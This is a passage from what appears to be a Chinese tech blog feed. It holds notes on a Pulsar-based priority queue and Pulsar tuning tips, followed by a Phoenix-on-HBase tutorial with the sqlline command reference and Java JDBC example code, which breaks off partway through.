的优先级队列方案"></a>基于 Pulsar 的优先级队列方案</h2><p>在设计思路上，Pulsar 方案和 Kafka 方案并没有多大区别。但在新方案中，个推技术团队借助 Pulsar 的特性，解决了 Kafka 方案中存在的问题。</p><ol><li>根据 task 动态生成 Topic，保证了后进入的 task 不会因为其他 task 消息堆积而造成等待情况。</li><li>中高优先级 task 都独享一个 Topic，低优先级 task 共享 n 个 Topic。</li><li>相同优先级内，各个 task 轮询读取消息，配额满后流转至下一个优先级。</li><li>相同优先级内, 各个 task 可动态调整 quota， 在相同机会内，可读取更多消息。</li><li>利用 Shared 模式, 可以动态添加删除 consumer，且不会触发 Rebalance 情况。</li><li>利用 BookKeeper 特性，可以更灵活的添加存储资源。</li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8phbi9bo2j20m80bkjv1.jpg" alt="undefined"></p><h2 id="Pulsar实践范例"><a href="#Pulsar实践范例" class="headerlink" title="Pulsar实践范例"></a>Pulsar实践范例</h2><ol><li>不同 subscription 之间相对独立，如果想要重复消费某个 Topic 的消息，需要使用不同的 subscriptionName 订阅；但是一直增加新的 subscriptionName，backlog 会不断累积。</li><li>如果 Topic 无人订阅，发给它的消息默认会被删除。因此如果 producer 先发送，consumer 后接收，一定要确保 producer 发送之前，Topic 有 subscription 存在(哪怕 subscribe 之后 close 掉)，否则这段时间发送的消息会导致无人处理。</li><li>如果既没有人发送消息，又没有人订阅消息，一段时间后 Topic 会自动删除。</li><li>Pulsar 的 TTL 等设置，是针对整个 namespace 起效的，无法针对单个 Topic。</li><li>Pulsar 的键都建立在 zookeeper 的根目录上，在初始化时建议增加总节点名。</li><li>目前 Pulsar 的 java api 设计，消息默认需要显式确认，这一点跟 Kafka 不一样。</li><li>Pulsar dashboard 上的 storage size 和 prometheus 上的 storage size (包含副本大小)概念不一样。</li><li>把<code>dbStorage_rocksDB_blockCacheSize</code> 设置的足够大；当消息体量大，出现backlog 大量堆积时, 使用默认大小(256M)会出现读耗时过大情况，导致消费变慢。</li><li>使用多 partition，提高吞吐。</li><li>在系统出现异常时，主动抓取 stats 和 stats-internal，里面有很多有用数据。</li><li>如果业务中会出现单 Topic 体量过大的情况，建议把 <code>backlogQuotaDefaultLimitGB</code> 设置的足够大(默认10G), 避免因为默认使用<code>producer_request_hold</code> 模式出现 block producer 的情况；当然可以根据实际业务选择合适的 <code>backlogQuotaDefaultRetentionPolicy</code>。</li><li>根据实际业务场景主动选择 backlog quota。</li><li>prometheus 内如果发现读耗时为空情况，可能是因为直接读取了缓存数据；Pulsar 在读取消息时会先读取 write cache, 然后读取 read cache；如果都没有命中, 则会在 RocksDB 中读取条目位子后，再从日志文件中读取该条目。</li><li>写入消息时, Pulsar 会同步写入 journal 和 write cache；write cache 再异步写入日志文件和 RocksDB； 所以有资源的话，建议 journal 盘使用SSD。</li></ol><h2 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h2><p>Bossie Awards中对 Pulsar 点评如下：“<strong>Pulsar 旨在取代 Apache Kafka 多年的主宰地位。</strong>Pulsar在很多情况下提供了比 Kafka 更快的吞吐量和更低的延迟，并为开发人员提供了一组兼容的 API，让他们可以很轻松地从 Kafka 切换到 Pulsar。Pulsar 的最大优点在于它提供了比 Apache Kafka 更简单明了、更健壮的一系列操作功能，特别在解决可观察性、地域复制和多租户方面的问题。在运行大型 Kafka 集群方面感觉有困难的企业可以考虑转向使用 Pulsar。”</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Pulsar与Kafka对比&quot;&gt;&lt;a href=&quot;#Pulsar与Kafka对比&quot; class=&quot;headerlink&quot; title=&quot;Pulsar与Kafka对比&quot;&gt;&lt;/a&gt;Pulsar与Kafka对比&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Pulsar 是一个比较新的MQ，和MQ的王者Kafka进行对比。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/bec9bff2ly1g9a1gg550rj20y107tq3l.jpg&quot; alt=&quot;TIM截图20191125094052.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Pulsar" scheme="http://yoursite.com/categories/Pulsar/"/>
    
      <category term="Kafka" scheme="http://yoursite.com/categories/Pulsar/Kafka/"/>
    
    
      <category term="Pulsar与Kafka对比" scheme="http://yoursite.com/tags/Pulsar%E4%B8%8EKafka%E5%AF%B9%E6%AF%94/"/>
    
  </entry>
  
  <entry>
    <title>Phoenix测试</title>
    <link href="http://yoursite.com/2019/11/05/Phoenix/"/>
    <id>http://yoursite.com/2019/11/05/Phoenix/</id>
    <published>2019-11-05T09:08:14.181Z</published>
    <updated>2019-11-06T09:59:16.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Phoenix"><a href="#Phoenix" class="headerlink" title="Phoenix"></a>Phoenix</h1><p>Phoenix实践</p><a id="more"></a> <h2 id="Phoenix启动安装基本操作"><a href="#Phoenix启动安装基本操作" class="headerlink" title="Phoenix启动安装基本操作"></a>Phoenix启动安装基本操作</h2><p>二级索引支持(gobal index + local index)</p><p>编译SQL成为原生HBase的可并行执行的Scan</p><h3 id="Phoenix结构"><a href="#Phoenix结构" class="headerlink" title="Phoenix结构"></a>Phoenix结构</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8oabze7naj20yg0judjv.jpg" alt="4.jpg"></p><p>Phoenix在Hadoop生态系统中的位置</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8oacads47j20qy0fn769.jpg" alt="5.jpg"></p><p>HBase性能提升</p><p>hbase1.2性能能提：</p><p>1.2相对1.1，提升是十分显著的，在某些方面的额提升，延迟低了好几倍，</p><p>更别说Hive over HBase，Hive over Hbase的性能下，Phoenix的性能是这种的好多倍。</p><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>配置：配置相对来说比较简单</p><p>Download：<a href="http://phoenix.apache.org/download.html，下载hbase对应版本的phoenix；解压bin.tar.gz包，拷贝**phoenix" target="_blank" rel="noopener">http://phoenix.apache.org/download.html，下载hbase对应版本的phoenix；解压bin.tar.gz包，拷贝**phoenix</a> server jar**包到hbase集群的每个region server 的lib目录下，然后重启hbase 集群。</p><p>phoniex 的启动命令是sqlline.py</p><p>使用bin/sqlline.py 172.16.0.128:2181连接上zk，就可以连接上HBase</p><h4 id="命令行操作"><a href="#命令行操作" class="headerlink" title="命令行操作"></a>命令行操作</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">!all               Execute the specified SQL against all the current connections</span><br><span class="line">!autocommit         Set autocommit mode on or off</span><br><span class="line">!batch             Start or execute a batch of statements</span><br><span class="line">!brief             Set verbose mode off</span><br><span class="line">!call               Execute a callable statement</span><br><span class="line">!close             Close the current connection to the database</span><br><span class="line">!closeall           Close all current open connections</span><br><span class="line">!columns           List all the columns for the specified table</span><br><span class="line">!commit             Commit the current transaction (if autocommit is off)</span><br><span class="line">!connect           Open a new connection to the database.</span><br><span class="line">!dbinfo             Give metadata information about the database</span><br><span class="line">!describe           Describe a table</span><br><span class="line">!dropall           Drop all tables in the current database</span><br><span class="line">!exportedkeys       List all the exported keys for the specified table</span><br><span class="line">!go                 Select the current connection</span><br><span class="line">!help               Print a summary of command usage</span><br><span class="line">!history           Display the command history</span><br><span class="line">!importedkeys       List all the imported keys for the specified table</span><br><span class="line">!indexes           List all the indexes for the specified table</span><br><span class="line">!isolation         Set the transaction isolation for this connection</span><br><span class="line">!list               List the current connections</span><br><span class="line">!manual             Display the SQLLine manual</span><br><span class="line">!metadata           Obtain metadata information</span><br><span class="line">!nativesql         Show the native SQL for the specified statement</span><br><span class="line">!outputformat       Set the output format for displaying results</span><br><span class="line">                  (table,vertical,csv,tsv,xmlattrs,xmlelements)</span><br><span class="line">!primarykeys       List all the primary keys for the specified table</span><br><span class="line">!procedures         List all the procedures</span><br><span class="line">!properties         Connect to the database specified in the properties file(s)</span><br><span class="line">!quit               Exits the program</span><br><span class="line">!reconnect         Reconnect to the database</span><br><span class="line">!record             Record all output to the specified file</span><br><span class="line">!rehash             Fetch table and column names for command completion</span><br><span class="line">!rollback           Roll back the current transaction (if autocommit is off)</span><br><span class="line">!run               Run a script from the specified file</span><br><span class="line">!save               Save the current variabes and aliases</span><br><span class="line">!scan               Scan for installed JDBC drivers</span><br><span class="line">!script             Start saving a script to a file</span><br><span class="line">!set               Set a sqlline variable</span><br><span class="line"></span><br><span class="line">Variable Value</span><br><span class="line">                  Description</span><br><span class="line">=============== ==========</span><br><span class="line">autoCommit true/false</span><br><span class="line">                  Enable/disable automatic</span><br><span class="line">transaction commit</span><br><span class="line">autoSave</span><br><span class="line">                   true/false Automatically save preferences</span><br><span class="line">color true/false</span><br><span class="line">                  Control whether color is used</span><br><span class="line">for display</span><br><span class="line">fastConnect</span><br><span class="line">                   true/false Skip building table/column list</span><br><span class="line">for</span><br><span class="line">                  tab-completion</span><br><span class="line">force true/false Continue running script</span><br><span class="line">                  even</span><br><span class="line">after errors</span><br><span class="line">headerInterval integer The interval between</span><br><span class="line">                  which</span><br><span class="line">headers are displayed</span><br><span class="line">historyFile path File in which to</span><br><span class="line">                  save command</span><br><span class="line">history. Default is</span><br><span class="line"><span class="meta">$</span>HOME/.sqlline/history</span><br><span class="line">                  (UNIX,</span><br><span class="line">Linux, Mac OS),</span><br><span class="line"><span class="meta">$</span>HOME/sqlline/history</span><br><span class="line">                  (Windows)</span><br><span class="line">incremental true/false Do not receive all rows</span><br><span class="line">                  from</span><br><span class="line">server before printing the first</span><br><span class="line">row. Uses fewer</span><br><span class="line">                  resources,</span><br><span class="line">especially for long-running</span><br><span class="line">queries, but column</span><br><span class="line">                  widths may</span><br><span class="line">be incorrect.</span><br><span class="line">isolation LEVEL Set transaction</span><br><span class="line">                  isolation level</span><br><span class="line">maxColumnWidth integer The maximum width to</span><br><span class="line">                  use when</span><br><span class="line">displaying columns</span><br><span class="line">maxHeight integer The maximum</span><br><span class="line">                  height of the</span><br><span class="line">terminal</span><br><span class="line">maxWidth integer The maximum width of</span><br><span class="line">                  the</span><br><span class="line">terminal</span><br><span class="line">numberFormat pattern Format numbers</span><br><span class="line">                  using</span><br><span class="line">DecimalFormat pattern</span><br><span class="line">outputFormat</span><br><span class="line">                  table/vertical/csv/tsv Format mode for</span><br><span class="line">result</span><br><span class="line">                  display</span><br><span class="line">propertiesFile path File from which SqlLine</span><br><span class="line">                  reads</span><br><span class="line">properties on startup; default</span><br><span class="line">                  is</span><br><span class="line"><span class="meta">$</span>HOME/.sqlline/sqlline.properties</span><br><span class="line">(UNIX, Linux, Mac</span><br><span class="line">                  OS),</span><br><span class="line"><span class="meta">$</span>HOME/sqlline/sqlline.properties</span><br><span class="line">(Windows)</span><br><span class="line">rowLimit</span><br><span class="line">                  integer Maximum number of rows returned</span><br><span class="line">from a query; zero</span><br><span class="line">                  means no</span><br><span class="line">limit</span><br><span class="line">showElapsedTime true/false Display execution</span><br><span class="line">                  time when</span><br><span class="line">verbose</span><br><span class="line">showHeader true/false Show column names in</span><br><span class="line">                  query</span><br><span class="line">results</span><br><span class="line">showNestedErrs true/false Display nested</span><br><span class="line">                  errors</span><br><span class="line">showWarnings true/false Display connection</span><br><span class="line">                  warnings</span><br><span class="line">silent true/false Be more silent</span><br><span class="line">timeout integer</span><br><span class="line">                  Query timeout in seconds; less</span><br><span class="line">than zero means no</span><br><span class="line">                  timeout</span><br><span class="line">trimScripts true/false Remove trailing spaces</span><br><span class="line">                  from</span><br><span class="line">lines read from script files</span><br><span class="line">verbose true/false Show</span><br><span class="line">                  verbose error messages and</span><br><span class="line">debug info</span><br><span class="line">!sql               Execute a SQL command</span><br><span class="line">!tables             List all the tables in the database</span><br><span class="line">!typeinfo           Display the type map for the current connection</span><br><span class="line">!verbose           Set verbose mode on</span><br><span class="line"></span><br><span class="line">Comments, bug reports, and patches go to ???</span><br></pre></td></tr></table></figure><p>这里面特别常见的有</p><p>!table 查看表</p><p>!quit 退出</p><p>平时命令行大多数都是输入SQL查看结果</p><p>对SQL的支持命令：</p><p>·         SELECT</p><p>·         UPSERT VALUES</p><p>·         UPSERT SELECT</p><p>·         DELETE</p><p>·         CREATE TABLE</p><p>·         DROP TABLE</p><p>·         CREATE FUNCTION</p><p>·         DROP FUNCTION</p><p>·         CREATE VIEW</p><p>·         DROP VIEW</p><p>·         CREATE SEQUENCE</p><p>·         DROP SEQUENCE</p><p>·         ALTER</p><p>·         CREATE INDEX</p><p>·         DROP SEQUENCE</p><p>·         ALTER</p><p>·         CREATE INDEX</p><p>·         DROP INDEX</p><p>·         ALTER INDEX</p><p>·         EXPLAIN</p><p>·         UPDATE STATISTICS</p><p>·         CREATE SCHEMA</p><p>·         USE</p><p>·         DROP SCHEMA</p><p>注意:在没有索引的情况下,针对大表使用非索引查询会非常耗时,很有可能会报超时错误.</p><h4 id="JDBC对Phoenix的基本操作"><a href="#JDBC对Phoenix的基本操作" class="headerlink" title="JDBC对Phoenix的基本操作"></a>JDBC对Phoenix的基本操作</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@Author</span> Administrator</span></span><br><span class="line"><span class="comment">* <span class="doctag">@create</span> 2019/9/9 17:13</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseDB</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// load driver</span></span><br><span class="line">           Class.forName(<span class="string">"org.apache.phoenix.jdbc.PhoenixDriver"</span>);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           <span class="comment">// jdbc 的 url 类似为 jdbc:phoenix [ :&lt;zookeeper quorum&gt; [ :&lt;port number&gt; ] [ :&lt;root node&gt; ] ]，</span></span><br><span class="line">           <span class="comment">// 需要引用三个参数：hbase.zookeeper.quorum、hbase.zookeeper.property.clientPort、and zookeeper.znode.parent，</span></span><br><span class="line">           <span class="comment">// 这些参数可以缺省不填而在 hbase-site.xml 中定义。</span></span><br><span class="line">           <span class="keyword">return</span> DriverManager.getConnection(<span class="string">"jdbc:phoenix:172.16.0.128:2181"</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Connection conn = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           conn = BaseDB.getConnection();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check connection</span></span><br><span class="line">           <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">"conn is null..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check if the table exist</span></span><br><span class="line">           ResultSet rs = conn.getMetaData().getTables(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="string">"USER"</span>,</span><br><span class="line">                   <span class="keyword">null</span>);</span><br><span class="line">           <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">               System.out.println(<span class="string">"table user is exist..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">           <span class="comment">// create sql</span></span><br><span class="line">           String sql = <span class="string">"CREATE TABLE user (id varchar PRIMARY KEY,INFO.account varchar ,INFO.passwd varchar)"</span>;</span><br><span class="line"></span><br><span class="line">           PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// execute</span></span><br><span class="line">           ps.execute();</span><br><span class="line">           System.out.println(<span class="string">"create success..."</span>);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   conn.close();</span><br><span class="line">              &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">upsert</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       Connection conn = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           conn = BaseDB.getConnection();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check connection</span></span><br><span class="line">           <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">"conn is null..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// create sql</span></span><br><span class="line">           String sql = <span class="string">"upsert into user(id, INFO.account, INFO.passwd) values('001', 'admin', 'admin')"</span>;</span><br><span class="line"></span><br><span class="line">           PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// execute upsert</span></span><br><span class="line">           String msg = ps.executeUpdate() &gt; <span class="number">0</span> ? <span class="string">"insert success..."</span></span><br><span class="line">                  : <span class="string">"insert fail..."</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// you must commit</span></span><br><span class="line">           conn.commit();</span><br><span class="line">           System.out.println(msg);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   conn.close();</span><br><span class="line">              &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       Connection conn = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           conn = BaseDB.getConnection();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check connection</span></span><br><span class="line">           <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">"conn is null..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// create sql</span></span><br><span class="line">           String sql = <span class="string">"select * from user"</span>;</span><br><span class="line"></span><br><span class="line">           PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">           ResultSet rs = ps.executeQuery();</span><br><span class="line"></span><br><span class="line">           System.out.println(<span class="string">"id"</span> + <span class="string">"\t"</span> + <span class="string">"account"</span> + <span class="string">"\t"</span> + <span class="string">"passwd"</span>);</span><br><span class="line">           System.out.println(<span class="string">"======================"</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (rs != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                   System.out.print(rs.getString(<span class="string">"id"</span>) + <span class="string">"\t"</span>);</span><br><span class="line">                   System.out.print(rs.getString(<span class="string">"account"</span>) + <span class="string">"\t"</span>);</span><br><span class="line">                   System.out.println(rs.getString(<span class="string">"passwd"</span>));</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> 